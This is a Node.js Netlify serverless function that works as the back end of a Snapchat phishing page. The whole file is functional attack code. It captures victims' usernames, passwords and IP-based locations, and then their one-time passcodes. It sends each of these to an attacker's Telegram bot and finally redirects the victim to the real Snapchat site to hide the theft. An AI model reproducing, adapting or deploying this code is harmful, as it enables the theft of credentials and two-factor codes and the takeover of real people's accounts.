const { URLSearchParams } = require('url');
const crypto = require('crypto');

// Access your Netlify environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// The main handler function for Netlify
exports.handler = async (event) => {
    // Only process POST requests
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    // Parse the form data from the request body
    const params = new URLSearchParams(event.body);
    const formType = params.get('form_type');

    if (formType === 'login') {
        // --- PHASE 1: CAPTURE LOGIN CREDENTIALS ---
        const username = params.get('username');
        const password = params.get('password');
        const ip = event.headers['x-nf-client-connection-ip'] || 'IP Not Found';
        const userAgent = event.headers['user-agent'] || 'User-Agent Not Found';
        
        // Generate a unique session ID to link the OTP later
        const sessionId = crypto.randomUUID();

        // Fetch geolocation data based on IP
        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,city,query`);
        const geoData = await geoResponse.json();
        
        let locationInfo = `Country: ${geoData.country} (${geoData.countryCode}), City: ${geoData.city}`;
        if(geoData.status !== 'success') {
            locationInfo = "Location data unavailable.";
        }

        // Format the message for Telegram
        const message = `
==[ SNAPCHAT LOGIN RECEIVED ]==
Session ID: ${sessionId}
Username:   ${username}
Password:   ${password}
---------------------------------
IP Address: ${ip}
Location:   ${locationInfo}
User-Agent: ${userAgent}
---------------------------------
`;

        // Send the data to the Telegram Bot
        await sendToTelegram(message);
        
        // Redirect the user to the OTP page with session and country code
        const redirectURL = `/otp.html?session=${sessionId}&cc=${geoData.countryCode || ''}`;
        
        return {
            statusCode: 302,
            headers: {
                Location: redirectURL,
            },
        };

    } else if (formType === 'otp') {
        // --- PHASE 2: CAPTURE OTP ---
        const otp = params.get('otp');
        const sessionId = params.get('session');

        const message = `
==[ OTP RECEIVED ]==
Session ID: ${sessionId}
OTP Code:   ${otp}
====================
`;
        await sendToTelegram(message);

        // Redirect the user to the real Snapchat site to complete the illusion
        return {
            statusCode: 302,
            headers: {
                Location: 'https://accounts.snapchat.com/',
            },
        };
    }

    // Fallback for unknown form types
    return { statusCode: 400, body: 'Bad Request' };
};

// Helper function to send messages to Telegram
async function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown', // Use 'HTML' or 'Markdown' for formatting
    };

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
    } catch (error) {
        console.error("Error sending to Telegram:", error);
    }
  }
